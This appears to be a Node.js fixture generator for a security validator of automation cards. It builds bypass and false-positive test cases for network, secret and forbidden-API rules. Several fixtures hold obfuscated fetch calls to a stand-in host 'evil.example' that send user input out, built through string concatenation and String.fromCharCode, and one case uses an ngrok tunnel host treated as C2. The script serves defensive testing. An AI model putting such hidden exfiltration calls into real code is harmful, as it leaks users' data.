  ['BP2-03-parent-of-psl-s3', 'E_NET_PATTERN_TOO_BROAD'], ['BP2-03-parent-of-psl-blob', 'E_NET_PATTERN_TOO_BROAD'], ['BP2-03-direct-s3-control', 'E_NET_PATTERN_TOO_BROAD'], ['BP2-03-neocities', 'E_NET_PATTERN_TOO_BROAD'],
  ['BP2-07-api_token', 'E_SECRET_PARAM'], ['BP2-07-access_key', 'E_SECRET_PARAM'], ['BP2-07-secret_key', 'E_SECRET_PARAM'], ['BP2-07-apiToken-camel', 'E_SECRET_PARAM'],
  ['BP2-09-label-pingzheng', 'E_INPUT_SECRET'], ['BP2-09-label-shouquanma', 'E_INPUT_SECRET'], ['BP2-09-label-appsecret', 'E_INPUT_SECRET'],
  ['BP2-10-destructure-constructor', 'E_CODE_FORBIDDEN_API'], ['BP2-10-computed-constructor', 'E_CODE_FORBIDDEN_API'], ['BP2-10-scope-shadow-fetch', 'E_CODE_FORBIDDEN_API'],
];
const BP_DIR = QA_DIR + 'bypass/cases/';
for (const [name, code] of BYPASS) {
  const file = `qa-${name}.json`;
  let text;
  try { text = readFileSync(BP_DIR + name + '.json', 'utf8'); } catch { text = readFileSync(EX + 'invalid/' + file, 'utf8'); }
  qaCases.push({ file, code, why: `安全测试变体样例 ${name}（qa/security/validator-cases/bypass）`, text });
}
const BYPASS_OK = ['BP-11-control-legal-expr', 'BP-10-control-clean-code', 'BP-07-control-no-secret', 'BP-06-control-https-link', 'BP-02-control-public', 'BP-03-control-github-com'];

// ---------- 额外正例：防止安全规则误报 ----------
const extra = [];
const ok = (file, why, base, ...muts) => { const c = load(base); c.meta.id = 'ok-' + file.replace(/\.json$/, ''); muts.forEach((m) => m(c)); extra.push({ file, why, c }); };
ok('wildcard-registrable-domain.json', '*.github.com：可注册域名上的子域通配是允许的', 'github-repo', (c) => { c.permissions.network.push('https://*.github.com/*'); });
ok('markdown-https-and-mailto.json', 'markdown 里的 https 链接、mailto 链接和普通的 "<" 符号', 'daily-brief', (c) => { S(c, 'n8').bind.content = '来源：[HN](https://news.ycombinator.com) · 反馈：<mailto:me@example.com> · 温度 < 0 时提醒\n\n{{n7.text}}'; });
ok('code-declared-url.json', '代码通过 platform.net.fetch 访问已声明的网址', 'keyword-watch', (c) => { c.permissions.network = ['https://hn.algolia.com/api/v1/*']; }, codeStep(KW_OK("  const r = await platform.net.fetch({ url: 'https://hn.algolia.com/api/v1/search?query=x' });")));
ok('jsonata-local-function.json', '表达式里自己定义的函数和允许清单内的内置函数', 'todo', (c) => { S(c, 'n2').expr = '( $pending := function($x){ $x.done = false }; { "items": n1.items, "pending": $count($filter(n1.items, $pending)) } )'; });
ok('text-less-than.json', 'VAL-16：说明文字里普通的小于号（“当温度 < 0 时提醒”）不算 HTML', 'todo', (c) => { c.meta.description = '当温度 < 0 时提醒，x > 3 也可以写'; });
ok('param-names-not-secret.json', 'VAL-07 归一化后不误伤：keyword、sort_key 以外的普通参数（keyword、per_page、author、monkey）', 'github-repo', (c) => { c.permissions.network.push('https://hn.algolia.com/api/v1/*'); S(c, 'n1').url = 'https://hn.algolia.com/api/v1/search?keyword=x&per_page=5&author=y&monkey=1&query={{inputs.repo}}'; });
ok('code-scoped-shadow.json', 'VAL-10 作用域：在当前作用域声明的同名变量（const fetch = platform.net.fetch）不报；数组下标只给提示', 'keyword-watch', (c) => { c.permissions.network = ['https://hn.algolia.com/api/v1/*']; }, codeStep(KW_OK("  const fetch = platform.net.fetch; const a = [1, 2]; let s = 0; for (let i = 0; i < a.length; i++) s += a[i];\n  await fetch({ url: 'https://hn.algolia.com/api/v1/search?query=x' });")));
ok('text-plain-symbols.json', '普通标点（& 和中文引号）不算 HTML', 'todo', (c) => { c.meta.description = '学习 & 复盘：把"今天要做的事"列出来'; });

ok('body-json-string-explicit.json', 'v1.1：字符串 body + Content-Type: application/json，属于非简单请求，必然预检', 'daily-brief', post({ 'Content-Type': 'application/json' }, '{"query":"x","page":1}'));
ok('body-json-object-explicit.json', 'v1.1：对象 body + Content-Type: application/json; charset=utf-8', 'daily-brief', post({ 'Content-Type': 'application/json; charset=utf-8' }, { query: 'x', tags: ['a', 'b'] }));
ok('body-no-content-type-defaulted.json', 'v1.1（技术负责人 10-05）：对象 body 省略 Content-Type，平台补 application/json，给警告 W_HTTP_CONTENT_TYPE_DEFAULTED', 'daily-brief', post(null, { q: 'x' }));
ok('body-string-no-content-type-defaulted.json', 'v1.1：字符串 body 省略 Content-Type，按 application/json 发送，给警告 W_HTTP_CONTENT_TYPE_DEFAULTED', 'daily-brief', post(null, '{"q":"x"}'));
ok('body-no-content-type-proxy-only-defaulted.json', 'v1.1：来源只由 requires:"proxy" 条目放行、省略 Content-Type：同样只是警告（补 application/json），与通道无关', 'daily-brief', (c) => { c.permissions.network.push({ pattern: 'https://api.example.com/form', requires: 'proxy', note: '只接受表单' }); post(null, { q: 'x' }, 'https://api.example.com/form')(c); });
ok('get-with-text-plain-accept.json', 'v1.1：GET 请求不受请求体类型约束（Content-Type 只对有请求体的写请求有意义）', 'daily-brief', (c) => { S(c, 'n1').headers = { Accept: 'text/plain' }; });

// ---- 带警告预期的正例（VAL-13 复核 2026-10-15）：卡片必须通过，并且 warn 里的警告码必须出现、notWarn 里的必须不出现 ----
// 写入 valid-extra/expected-warnings.json，validate.mjs --selftest 检查
const warnExp = {};
const okw = (file, why, exp, base, ...muts) => { ok(file, why, base, ...muts); warnExp[file] = exp; };
const HN = (c) => { c.permissions.network = ['https://hn.algolia.com/api/v1/*']; };
warnExp['code-declared-url.json'] = { notWarn: ['W_CODE_DYNAMIC_URL', 'W_NET_UNUSED'] };
okw('code-dynamic-url-concat.json', 'W_CODE_DYNAMIC_URL：platform.net.fetch 的 url 是字符串拼接', { warn: ['W_CODE_DYNAMIC_URL'] }, 'keyword-watch', HN, codeStep(KW_OK("  const r = await platform.net.fetch({ url: 'https://hn.algolia.com/api/v1/search?query=' + input.q });")));
okw('code-dynamic-url-concat-host.json', 'W_CODE_DYNAMIC_URL + W_NET_UNUSED：拼接出主机名（\'https://ev\' + \'il.example/x\'），字面量片段不是完整网址，已声明来源没被用到', { warn: ['W_CODE_DYNAMIC_URL', 'W_NET_UNUSED'] }, 'keyword-watch', HN, codeStep(KW_OK("  const r = await platform.net.fetch({ url: 'htt' + 'ps://ev' + 'il.example/x?d=' + input.q });")));
okw('code-dynamic-url-fromcharcode.json', 'W_CODE_DYNAMIC_URL + W_NET_UNUSED：String.fromCharCode 混淆网址，静态看不到主机；已声明的来源没被字面量用到', { warn: ['W_CODE_DYNAMIC_URL', 'W_NET_UNUSED'] }, 'keyword-watch', HN, codeStep(KW_OK("  const u = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 118, 105, 108, 46, 101, 120, 97, 109, 112, 108, 101, 47);\n  const r = await platform.net.fetch({ url: String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 118, 105, 108, 46, 101, 120, 97, 109, 112, 108, 101, 47) });\n  const r2 = await platform.net.fetch({ url: u });")));
okw('code-dynamic-url-template.json', 'W_CODE_DYNAMIC_URL：url 是带插值的模板串', { warn: ['W_CODE_DYNAMIC_URL'] }, 'keyword-watch', HN, codeStep(KW_OK("  const r = await platform.net.fetch({ url: `https://hn.algolia.com/api/v1/search?query=${input.q}` });")));
okw('code-dynamic-url-variable.json', 'W_CODE_DYNAMIC_URL：url 来自变量（即使是 const 字面量也提示，要求直接写在调用处）', { warn: ['W_CODE_DYNAMIC_URL'], notWarn: ['W_NET_UNUSED'] }, 'keyword-watch', HN, codeStep(KW_OK("  const base = 'https://hn.algolia.com/api/v1/search?query=x';\n  const r = await platform.net.fetch({ url: base });")));
okw('code-dynamic-url-opts-object.json', 'W_CODE_DYNAMIC_URL：整个参数对象来自变量 / 展开，看不到 url', { warn: ['W_CODE_DYNAMIC_URL'] }, 'keyword-watch', HN, codeStep(KW_OK("  const opts = { url: 'https://hn.algolia.com/api/v1/search?query=x' };\n  const r = await platform.net.fetch(opts);\n  const r2 = await platform.net.fetch({ ...opts });")));
okw('code-literal-template-url.json', '无插值模板串算字面量，不给 W_CODE_DYNAMIC_URL', { notWarn: ['W_CODE_DYNAMIC_URL', 'W_NET_UNUSED'] }, 'keyword-watch', HN, codeStep(KW_OK("  const r = await platform.net.fetch({ url: `https://hn.algolia.com/api/v1/search?query=x` });")));
okw('code-net-unused.json', 'VAL-13 复核：含代码的卡片也检查 W_NET_UNUSED（以前跳过）', { warn: ['W_NET_UNUSED'], notWarn: ['W_CODE_DYNAMIC_URL'] }, 'keyword-watch', (c) => { c.permissions.network = ['https://hn.algolia.com/api/v1/*', 'https://api.github.com/*']; }, codeStep(KW_OK("  const r = await platform.net.fetch({ url: 'https://hn.algolia.com/api/v1/search?query=x' });")));
okw('tunnel-host-sunny-ngrok.json', 'VAL-13 复核：sunny-ngrok.com 下的具体主机通过，但报 W_NET_TUNNEL_HOST（C2 包装层按失败处理）', { warn: ['W_NET_TUNNEL_HOST'] }, 'keyword-watch', (c) => { c.permissions.network = ['https://abc.sunny-ngrok.com/api/*']; }, codeStep(KW_OK("  const r = await platform.net.fetch({ url: 'https://abc.sunny-ngrok.com/api/x' });")));

const expected = {};
for (const { file, code, why, c, options } of cases) { writeFileSync(EX + 'invalid/' + file, JSON.stringify(c, null, 2) + '\n'); expected[file] = options ? { code, why, options } : { code, why }; }
for (const { file, code, also, why, text } of qaCases) { writeFileSync(EX + 'invalid/' + file, text); expected[file] = also ? { code, also, why } : { code, why }; }
mkdirSync(EX + 'valid-extra', { recursive: true });
for (const { file, why, c } of extra) writeFileSync(EX + 'valid-extra/' + file, JSON.stringify({ ...c, $comment: undefined }, null, 2) + '\n');
for (const name of BYPASS_OK) {           // 安全测试 bypass 的对照样例（应通过），原样并入
  let text; try { text = readFileSync(BP_DIR + name + '.json', 'utf8'); } catch { text = readFileSync(EX + 'valid-extra/qa-' + name + '.json', 'utf8'); }
  writeFileSync(EX + 'valid-extra/qa-' + name + '.json', text); extra.push({ file: 'qa-' + name + '.json', why: `安全测试对照样例 ${name}（bypass，应通过）` });
}
// VAL-13 复核第 2 轮（安全测试 2026-10-15，P2-1）：platform 间接调用的 C01–C05 原样并入，带警告预期
const R2_DIR = QA_DIR + 'results/20261015-VAL13-r2/cases/';
const R2 = {
  'C01-alias-noliteral': ['const f = platform.net.fetch 后调用 f()', ['W_CODE_PLATFORM_ALIAS']],
  'C02-destructure-noliteral': ['const { fetch: g } = platform.net 后调用 g()', ['W_CODE_PLATFORM_ALIAS']],
  'C03-computed-key-noliteral': ["platform.net['fe'+'tch']() 计算属性（可折叠也算）", ['W_CODE_DYNAMIC_MEMBER']],
  'C04-ns-alias-noliteral': ['const n = platform.net 后调用 n.fetch()', ['W_CODE_PLATFORM_ALIAS']],
  'C05-param-rename': ['const p = platform 后调用 p.net.fetch()', ['W_CODE_PLATFORM_ALIAS']],
};
for (const [name, [desc, warn]] of Object.entries(R2)) {
  const file = 'qa-VAL13r2-' + name + '.json';
  let text; try { text = readFileSync(R2_DIR + name + '.json', 'utf8'); } catch { text = readFileSync(EX + 'valid-extra/' + file, 'utf8'); }
  writeFileSync(EX + 'valid-extra/' + file, text); extra.push({ file, why: `安全测试 VAL-13 第 2 轮 ${name}：${desc}，应通过并报 ${warn.join('、')}` });
  warnExp[file] = { warn };
}
// VAL-13 复核第 3 轮（安全测试 2026-10-15，P2-3）：platform 按绑定识别。E/D 组必须报警告；F 组和 D17（内层同名变量）不得报 platform 相关警告
const R3_DIR = QA_DIR + 'results/20261015-VAL13-r3/cases/';
const SEC = ['W_CODE_PLATFORM_ALIAS', 'W_CODE_DYNAMIC_URL', 'W_CODE_DYNAMIC_MEMBER'];
const R3 = {
  'E01-rest-params': ['run(...a) 剩余参数取 platform', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'E02-param-destructure': ['run(input, { net }) 解构 platform', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'E03-arguments-alias': ['const a = arguments 后 a[1].net.fetch', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'E04-arguments-computed': ["arguments[1]['net'].fetch", { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'E05-renamed-param': ['run(input, p) 形参改名后 p.net.fetch({ url: 变量 })', { warn: ['W_CODE_DYNAMIC_URL'] }],
  'E06-renamed-param-alias': ['run(input, p) 形参改名后 const f = p.net.fetch', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'D07-arguments': ['把 platform 当参数传给内部函数，内部用 arguments 取出', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'D08-arguments-run': ['const pl = arguments[1]', { warn: ['W_CODE_PLATFORM_ALIAS'] }],
  'D17-shadow-redeclare': ['块内另声明同名变量 platform，不是平台对象，不报 platform 相关警告', { notWarn: SEC }],
  'F01-fp-direct': ['误报对照：直接 platform.net.fetch 字面量', { notWarn: [...SEC, 'W_NET_UNUSED'] }],
  'F02-fp-direct-multi': ['误报对照：多次直接调用平台接口', { notWarn: [...SEC, 'W_NET_UNUSED'] }],
  'F03-fp-other-var-fetch': ['误报对照：无关对象的 .fetch、obj.platform（已声明网址未用，W_NET_UNUSED 属预期）', { notWarn: SEC }],
  'F04-fp-json-key': ["误报对照：响应对象的计算属性 r['data']", { notWarn: [...SEC, 'W_NET_UNUSED'] }],
};
for (const [name, [desc, exp]] of Object.entries(R3)) {
  const file = 'qa-VAL13r3-' + name + '.json';
  let text; try { text = readFileSync(R3_DIR + name + '.json', 'utf8'); } catch { text = readFileSync(EX + 'valid-extra/' + file, 'utf8'); }
  writeFileSync(EX + 'valid-extra/' + file, text); extra.push({ file, why: `安全测试 VAL-13 第 3 轮 ${name}：${desc}` });
  warnExp[file] = exp;
}
writeFileSync(EX + 'valid-extra/README.md', '# 额外正例\n\n防止安全规则误报的正例，`npm test` 要求全部通过。由 `card-validator/tools/make-invalid.mjs` 生成。\n\n' + extra.map((e) => `- \`${e.file}\`：${e.why}`).join('\n') + '\n');
writeFileSync(EX + 'valid-extra/expected-warnings.json', JSON.stringify(warnExp, null, 2) + '\n');
writeFileSync(EX + 'invalid/expected.json', JSON.stringify(expected, null, 2) + '\n');
console.log(cases.length + qaCases.length, '个反例；', extra.length, '个额外正例');
